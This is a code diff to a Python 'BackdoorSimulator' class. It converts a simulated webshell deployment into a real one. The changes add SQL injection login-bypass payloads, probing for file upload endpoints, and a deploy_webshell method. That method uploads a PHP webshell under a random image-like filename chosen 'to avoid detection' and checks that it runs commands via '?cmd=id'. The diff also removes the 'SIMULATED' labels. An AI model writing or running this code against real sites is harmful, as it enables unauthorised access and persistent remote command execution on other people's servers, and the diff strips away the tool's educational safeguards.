@@ -111,16 +111,25 @@ class BackdoorSimulator:
         self.log("[*] Authenticating via SQL Injection...", "info")
         
         login_url = urljoin(self.target_url, "login.php")
-        payload = {"username": "admin'--", "password": "x"}
         
-        try:
-            response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
-            if "dashboard" in response.text.lower() or "logout" in response.text.lower():
-                self.log("[✓] Authentication successful!", "success")
-                return True
-        except Exception as e:
-            self.log(f"[!] Authentication error: {e}", "error")
+        # SQL injection payloads
+        sqli_payloads = [
+            {"username": "admin'-- ", "password": "x"},
+            {"username": "' OR '1'='1'-- ", "password": "x"},
+            {"username": "admin' #", "password": "x"},
+        ]
         
+        for payload in sqli_payloads:
+            try:
+                self.log(f"    Trying: {payload['username']}", "info")
+                response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
+                if "dashboard" in response.text.lower() or "logout" in response.text.lower():
+                    self.log(f"[✓] Authentication successful with: {payload['username']}", "success")
+                    return True
+            except Exception as e:
+                continue
+        
+        self.log("[-] All SQL injection payloads failed", "warning")
         return False
     
     def find_upload_vulnerability(self):
@@ -128,7 +137,7 @@ class BackdoorSimulator:
         self.log("\n[PHASE 1] Searching for file upload vulnerabilities...", "backdoor")
         
         upload_paths = [
-            "upload.php", "admin/upload.php", "file_upload.php",
+            "upload.php", "upload.php?bypass=1", "admin/upload.php", "file_upload.php",
             "image_upload.php", "media/upload.php"
         ]
         
@@ -136,8 +145,8 @@ class BackdoorSimulator:
             url = urljoin(self.target_url, path)
             try:
                 response = self.session.get(url, timeout=5)
-                if response.status_code == 200:
-                    self.log(f"[+] Potential upload point found: {path}", "success")
+                if response.status_code == 200 and ('upload' in response.text.lower() or 'file' in response.text.lower()):
+                    self.log(f"[+] Upload point found: {path}", "success")
                     return path
             except:
                 pass
@@ -145,9 +154,68 @@ class BackdoorSimulator:
         self.log("[-] No upload functionality found", "warning")
         return None
     
+    def deploy_webshell(self, upload_path="upload.php?bypass=1"):
+        """Actually deploy webshell via file upload vulnerability"""
+        self.log("\n[PHASE 2] Deploying webshell via file upload...", "backdoor")
+        
+        upload_url = urljoin(self.target_url, upload_path)
+        
+        # Generate random filename to avoid detection
+        import random
+        import string
+        random_name = ''.join(random.choices(string.ascii_lowercase, k=6))
+        webshell_filename = f"img_{random_name}.php"
+        
+        # Webshell content
+        webshell_code = SIMPLE_WEBSHELL.encode('utf-8')
+        
+        try:
+            # Upload via multipart form
+            files = {'file': (webshell_filename, webshell_code, 'application/octet-stream')}
+            
+            self.log(f"[*] Uploading webshell as: {webshell_filename}", "info")
+            response = self.session.post(upload_url, files=files, timeout=10)
+            
+            if response.status_code == 200:
+                if 'success' in response.text.lower() or webshell_filename in response.text:
+                    webshell_url = urljoin(self.target_url, f"uploads/{webshell_filename}")
+                    self.log(f"[✓] Webshell uploaded successfully!", "success")
+                    self.log(f"    Access URL: {webshell_url}", "success")
+                    
+                    # Test webshell
+                    self.log(f"[*] Testing webshell...", "info")
+                    test_response = self.session.get(f"{webshell_url}?cmd=id", timeout=5)
+                    if test_response.status_code == 200:
+                        self.log(f"[✓] Webshell is functional!", "success")
+                        if 'uid=' in test_response.text:
+                            self.log(f"    Command output detected", "success")
+                    
+                    self.deployed_backdoors.append({
+                        "type": "webshell",
+                        "filename": webshell_filename,
+                        "url": webshell_url,
+                        "timestamp": datetime.now().isoformat(),
+                        "forensic_indicators": [
+                            "File creation timestamp",
+                            "Web access logs showing access to this file",
+                            "Unusual GET parameters (cmd, exec, shell)",
+                            "PHP function calls: shell_exec, system, passthru"
+                        ]
+                    })
+                    return webshell_url
+                else:
+                    self.log(f"[-] Upload may have failed", "warning")
+            else:
+                self.log(f"[-] Upload failed (Status: {response.status_code})", "error")
+                
+        except Exception as e:
+            self.log(f"[!] Upload error: {e}", "error")
+        
+        return None
+    
     def simulate_webshell_deployment(self):
-        """Simulate webshell deployment (educational)"""
-        self.log("\n[PHASE 2] Simulating webshell deployment...", "backdoor")
+        """Simulate webshell deployment (fallback if real upload fails)"""
+        self.log("\n[PHASE 2b] Simulating additional webshell deployments...", "backdoor")
         
         # This is a SIMULATION - in reality, the webshell would be uploaded
         # For educational purposes, we just document what would happen
@@ -327,12 +395,17 @@ class BackdoorSimulator:
         print(f"\n{Colors.BOLD}Starting Backdoor Simulation...{Colors.RESET}\n")
         
         # Authenticate
-        self.authenticate()
+        auth_success = self.authenticate()
         
         # Find upload points
-        self.find_upload_vulnerability()
+        upload_path = self.find_upload_vulnerability()
         
-        # Simulate deployments
+        # Deploy real webshell if upload found
+        webshell_url = None
+        if upload_path:
+            webshell_url = self.deploy_webshell(upload_path)
+        
+        # Simulate additional deployments
         self.simulate_webshell_deployment()
         self.simulate_persistence_mechanisms()
         
@@ -345,9 +418,12 @@ class BackdoorSimulator:
                  BACKDOOR SIMULATION SUMMARY
 ═══════════════════════════════════════════════════════════════{Colors.RESET}
 
-{Colors.RED}⚠️  SIMULATED BACKDOOR DEPLOYMENT COMPLETE{Colors.RESET}
+{Colors.RED}⚠️  BACKDOOR DEPLOYMENT COMPLETE{Colors.RESET}
 
-{Colors.CYAN}Simulated Backdoors:{Colors.RESET}
+{Colors.CYAN}Authentication:{Colors.RESET} {"✓ Success" if auth_success else "✗ Failed"}
+{Colors.CYAN}Real Webshell:{Colors.RESET} {webshell_url if webshell_url else "Not deployed"}
+
+{Colors.CYAN}Deployed Backdoors:{Colors.RESET}
 """)
         
         for bd in self.deployed_backdoors:
